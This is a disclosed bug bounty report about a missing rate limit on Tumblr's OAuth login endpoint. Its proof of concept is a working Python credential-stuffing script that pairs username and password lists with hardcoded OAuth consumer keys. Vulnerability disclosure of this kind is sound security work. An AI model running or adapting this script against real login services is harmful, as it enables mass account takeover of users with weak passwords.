# Rate Limit Misconfiguration on tumblr login .

## Report Details
- **Report ID**: 708917
- **URL**: https://hackerone.com/reports/708917
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-10-07T13:01:27.908Z
- **Disclosed**: 2020-11-13T17:06:07.916Z

## Reporter
- **Username**: u0pattern
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
The Rate Limit should always be on the login endpoint and have an acceptable limit, for example, 20 rate limit, but when there is no limit or the limit is huge, for example, 5000, this is certainly dangerous because it is a Rate Limit Misconfiguration, [for example](https://hackerone.com/reports/385381) .

--------------
## PoC :
```python
import requests,requests_oauthlib
########################################################################
oauth_consumer_key = 'BUHsuO5U9DF42uJtc8QTZlOmnUaJmBJGuU1efURxeklbdiLn9L'
oauth_consumer_secret = 'olOu3aRBCdqCuMFm8fmzNjMAWmICADSIuXWTnVSFng1ZcLU1cV'
# https://github.com/kennydude/tumblr-client/blob/master/common.php#L89
########################################################################
url = 'https://www.tumblr.com/oauth/access_token'
users = open('users.txt','r').read().splitlines()
passwords = open('passwords:.txt','r').read().splitlines()
for user in users:
	for p4ss in passwords:
		data_p = 'x_auth_username='+user+'&x_auth_password='+p4ss+'&x_auth_mode=client_auth'
		a = requests.post(url,auth=requests_oauthlib.OAuth1(oauth_consumer_key,oauth_consumer_secret,decoding=None),data=data_p).text
		print(a)
```

--------

## Impact

The attacker can access to many accounts whose passwords are weak .

## Attachments
No attachments
